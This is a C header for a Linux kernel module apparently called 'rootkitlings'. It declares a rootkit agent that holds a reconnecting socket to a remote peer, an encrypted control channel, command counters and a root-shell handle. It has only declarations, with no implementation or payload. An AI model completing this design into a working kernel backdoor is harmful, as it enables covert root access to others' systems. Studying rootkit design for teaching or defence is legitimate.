/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_AGENT_H
#define ROOTKITLINGS_AGENT_H

#include <linux/compiler_attributes.h>
#include <linux/in.h>
#include <linux/mutex.h>
#include <linux/types.h>
#include <linux/wait.h>

#include "framing.h"
#include "protocol.h"
#include "secure_control.h"

struct socket;
struct rk_root_shell;
struct rk_state;
struct task_struct;

struct rk_agent {
	struct mutex lock;
	wait_queue_head_t retry_wait;
	struct task_struct *task;
	struct socket *active;
	struct sockaddr_in peer;
	bool initialized;
	bool stopping;
	bool connected;
	bool shutdown_started;
	bool commands_ready;
	struct rk_state *state;
	struct rk_root_shell *shell;
	unsigned int retry_base_ms;
	unsigned int retry_max_ms;
	unsigned int retry_delay_ms;
	u64 attempts;
	u64 connections;
	u64 commands;
	u64 retries;
	u64 transport_errors;
	u64 protocol_errors;
	u64 session;
	char marker[RK_MARKER_MAX + 1];
	struct rk_secure_channel secure;
};

struct rk_agent_status {
	bool running;
	bool connected;
	bool stopping;
	u16 peer_port;
	unsigned int retry_base_ms;
	unsigned int retry_max_ms;
	unsigned int retry_delay_ms;
	u64 attempts;
	u64 connections;
	u64 commands;
	u64 retries;
	u64 transport_errors;
	u64 protocol_errors;
	u64 session;
	char marker[RK_MARKER_MAX + 1];
};

__must_check int rk_agent_start(struct rk_agent *agent, u16 peer_port,
				unsigned int retry_base_ms,
				unsigned int retry_max_ms, const u8 *key,
				size_t key_length, u64 session,
				struct rk_state *state,
				struct rk_root_shell *shell);
void rk_agent_enable_commands(struct rk_agent *agent);
void rk_agent_stop(struct rk_agent *agent);
void rk_agent_snapshot(struct rk_agent *agent, struct rk_agent_status *status);

#endif
